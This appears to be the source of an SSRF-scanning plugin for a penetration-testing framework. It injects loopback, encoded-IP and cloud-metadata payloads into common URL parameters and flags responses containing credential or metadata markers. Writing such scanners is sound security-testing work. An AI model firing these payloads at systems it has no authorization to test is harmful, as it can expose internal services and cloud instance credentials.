"""Server-Side Request Forgery (SSRF) detection."""

from __future__ import annotations

import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

SSRF_PARAMS = [
    "url", "link", "redirect", "page", "uri", "src", "href", "path",
    "file", "document", "domain", "host", "site", "source", "dest",
    "target", "return", "next", "callback", "feed", "to", "out",
    "view", "load", "data", "reference",
]

SSRF_PAYLOADS = [
    ("http://127.0.0.1/", "ipv4-loopback"),
    ("http://localhost/", "localhost"),
    ("http://[::1]/", "ipv6-loopback"),
    ("http://169.254.169.254/latest/meta-data/", "aws-metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata"),
    ("http://0x7f000001/", "hex-ip"),
    ("http://2130706433/", "decimal-ip"),
    ("http://0177.0.0.1/", "octal-ip"),
    ("http://127.1/", "short-loopback"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure-metadata"),
    ("http://100.100.100.200/latest/meta-data/", "alibaba-metadata"),
    ("http://192.168.0.1/", "private-net-192"),
    ("http://10.0.0.1/", "private-net-10"),
    ("http://172.16.0.1/", "private-net-172"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "ipv6-mapped-v4"),
    ("http://0/", "zero-ip"),
]

SCAN_PAGES = ["/", "/search", "/fetch", "/proxy", "/api/fetch", "/load"]

# Indicators of successful SSRF — internal content leaked in response
SSRF_INDICATORS = [
    "root:", "ami-id", "instance-id", "availabilityZone",
    "computeMetadata", "meta-data", "local-ipv4",
    "iam/security-credentials",
    "security-credentials", "instance-identity",
    "hostname", "public-keys", "placement",
    "resourceGroupName", "subscriptionId",
]


class SsrfCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssrf_check",
        display_name="SSRF Check",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects Server-Side Request Forgery vulnerabilities"
        ),
        produces=["ssrf_findings"],
        timeout=25.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host,
                error="HTTP client not available",
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(
                        f"{scheme}://{target.host}/", timeout=5.0,
                    )
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"ssrf_tests": []},
            )

        # Collect baseline response lengths for each scan page
        baselines: dict[str, int] = {}
        for page in SCAN_PAGES:
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{page}", timeout=8.0,
                    )
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )
                    baselines[page] = len(body)
            except Exception:
                baselines[page] = -1

        for page in SCAN_PAGES:
            if baselines.get(page, -1) == -1:
                continue

            for param in SSRF_PARAMS:
                for payload, label in SSRF_PAYLOADS:
                    url = (
                        f"{base_url}{page}"
                        f"?{param}={quote(payload, safe='')}"
                    )
                    try:
                        async with ctx.rate:
                            t0 = time.monotonic()
                            resp = await ctx.http.get(
                                url, timeout=10.0,
                            )
                            elapsed = time.monotonic() - t0
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                    except Exception:
                        continue

                    body_lower = body.lower()

                    # Check for confirmed SSRF — internal content
                    confirmed = False
                    matched_indicator = ""
                    for indicator in SSRF_INDICATORS:
                        if indicator.lower() in body_lower:
                            confirmed = True
                            matched_indicator = indicator
                            break

                    if confirmed:
                        tested.append({
                            "page": page,
                            "param": param,
                            "payload": payload,
                            "label": label,
                            "indicator": matched_indicator,
                            "confirmed": True,
                        })
                        findings.append(Finding.high(
                            f"SSRF confirmed via ?{param}= "
                            f"on {page}",
                            description=(
                                f"Server fetched internal resource "
                                f"({label}). Response contains "
                                f"internal content marker: "
                                f"{matched_indicator}"
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Indicator: {matched_indicator}\n"
                                f"Response length: {len(body)}"
                            ),
                            remediation=(
                                "Validate and sanitize all "
                                "user-supplied URLs. Block requests "
                                "to internal/private IP ranges. "
                                "Use an allowlist of permitted "
                                "domains."
                            ),
                            tags=["pentesting", "ssrf"],
                        ))
                        continue

                    # Check for potential SSRF — suspicious signals
                    suspicious = False
                    reason = ""

                    # Localhost / 127.0.0.1 reflected in body
                    if (
                        "127.0.0.1" in body
                        or "localhost" in body_lower
                    ):
                        baseline_body_lower = ""
                        try:
                            async with ctx.rate:
                                br = await ctx.http.get(
                                    f"{base_url}{page}",
                                    timeout=8.0,
                                )
                                baseline_body_lower = (
                                    await br.text(
                                        encoding="utf-8",
                                        errors="replace",
                                    )
                                ).lower()
                        except Exception:
                            pass

                        if (
                            "127.0.0.1" not in baseline_body_lower
                            and "localhost" not in baseline_body_lower
                        ):
                            suspicious = True
                            reason = (
                                "Response contains localhost/"
                                "127.0.0.1 not present in baseline"
                            )

                    # Significant body length difference
                    baseline_len = baselines.get(page, -1)
                    if (
                        not suspicious
                        and resp.status == 200
                        and baseline_len > 0
                    ):
                        diff = abs(len(body) - baseline_len)
                        threshold = max(baseline_len * 0.5, 200)
                        if diff > threshold:
                            suspicious = True
                            reason = (
                                f"Response length {len(body)} "
                                f"differs significantly from "
                                f"baseline {baseline_len} "
                                f"(delta={diff})"
                            )

                    # Timing anomaly — very slow response
                    if not suspicious and elapsed > 5.0:
                        suspicious = True
                        reason = (
                            f"Response took {elapsed:.1f}s — "
                            f"possible internal network fetch"
                        )

                    if suspicious:
                        tested.append({
                            "page": page,
                            "param": param,
                            "payload": payload,
                            "label": label,
                            "reason": reason,
                            "confirmed": False,
                        })
                        findings.append(Finding.medium(
                            f"Potential SSRF via ?{param}= "
                            f"on {page}",
                            description=(
                                f"Suspicious response when "
                                f"injecting {label} payload. "
                                f"{reason}"
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Status: {resp.status}\n"
                                f"Response length: {len(body)}\n"
                                f"Time: {elapsed:.2f}s"
                            ),
                            remediation=(
                                "Validate and sanitize all "
                                "user-supplied URLs. Block requests "
                                "to internal/private IP ranges. "
                                "Use an allowlist of permitted "
                                "domains."
                            ),
                            tags=["pentesting", "ssrf"],
                        ))

        if not findings:
            findings.append(Finding.info(
                "No SSRF vulnerabilities detected",
                tags=["pentesting", "ssrf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"ssrf_tests": tested},
        )
